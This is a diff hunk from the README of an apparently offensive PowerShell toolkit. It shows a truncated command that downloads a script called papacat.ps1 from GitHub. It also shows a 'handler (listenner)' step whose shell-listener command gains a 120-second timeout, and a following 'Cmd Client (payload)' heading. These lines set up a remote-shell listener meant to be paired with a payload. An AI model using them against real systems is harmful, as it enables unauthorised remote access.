@@ -81,7 +81,7 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/papa
 #### handler (listenner)
 ```powershell
 Import-Module -Name .\papacat.ps1 -Force
-papacat -l -p 666 -v
+papacat -l -p 666 -t 120 -v
 ```
 
 #### Cmd Client (payload)
